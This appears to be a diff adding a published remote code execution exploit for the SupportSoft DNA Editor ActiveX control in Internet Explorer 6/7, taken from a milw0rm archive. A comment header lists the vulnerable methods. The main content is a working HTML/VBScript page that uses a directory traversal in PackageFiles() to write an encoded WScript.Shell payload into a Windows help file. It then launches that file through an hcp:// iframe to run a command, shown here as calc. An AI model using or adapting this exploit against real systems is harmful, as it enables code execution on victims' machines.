@@ -1,0 +1,43 @@
+<!-- SupportSoft DNA Editor Module (dnaedit.dll v6.9.2205) remote code execution exploit (IE6/7)
+     by Nine:Situations:Group::bruiser
+
+     vendor url: http://www.supportsoft.com/
+     our site: http://retrogod.altervista.org/
+
+     details:
+     CLSID: {01110800-3E00-11D2-8470-0060089874ED}
+     Progid: Tioga.Editor.1
+     Binary Path: C:\Programmi\File comuni\SupportSoft\bin\dnaedit.dll
+     KillBitted: False
+     Implements IObjectSafety: True
+     Safe For Initialization (IObjectSafety): True
+     Safe For Scripting (IObjectSafety): True
+
+     vulnerabilities, discovered two months ago:
+     insecure methods: Packagefiles() - remote file overwrite, directory traversal, *script injection* and ... a crash (investigating on this one)
+                       SaveDna() - remote file creation, directory traversal
+                       AddFile() - remote cpu consumption
+                       SetIdentity() - remote file creation
+
+     This dll was present inside the SupportSoft ActiveX Controls Security Update for a previous buffer overflow vulnerability,
+     see: http://secunia.com/advisories/24246/
+     My download url was: http://www.supportsoft.com/support/controls_update.asp
+     actually unreachable
+     see also: http://www.securityfocus.com/archive/1/archive/1/461147/100/0/threaded
+     Well, they probably patched my marking them unsafe for initialization (I see that the ScriptRunner module suffers  of a
+     buffer overflow bug in the Evaluate() method...) but they gave you another vulnerable control...
+-->
+<HTML>
+<OBJECT classid='clsid:01110800-3E00-11D2-8470-0060089874ED' width=1 height=1 id='DNAEditorCtl' />
+</OBJECT>
+<SCRIPT language='VBScript'>
+<!--
+sh="<HTML><SCRIPT LANGUAGE=VBScript>" + unescape("Execute%28unescape%28%22Set%20s%3DCreateObject%28%22%22WScript.Shell%22%22%29%250D%250As.Run%20%22%22cmd%20%252fc%20start%20calc%22%22%22%29%29") + "<" + Chr(47) + "SCRIPT><" + Chr(47) + "HTML>"
+'file path is injected in msinfo.htm, you can see the code by an hex editor, some limit with *number* of chars, some problem with newlines, resolved with vbscript code evaluation by Execute(), a popup says Unable to post... click Ok or close it and you are pwned
+DNAEditorCtl.PackageFiles sh + "../../../../../../../../../WINDOWS/PCHEALTH/HELPCTR/System/sysinfo/msinfo.htm"
+'launch the script and calc.exe trough the Help and Support Center Service
+document.write("<iframe src=""hcp://system/sysinfo/msinfo.htm"">")
+-->
+</SCRIPT>
+
+# milw0rm.com [2009-03-05]
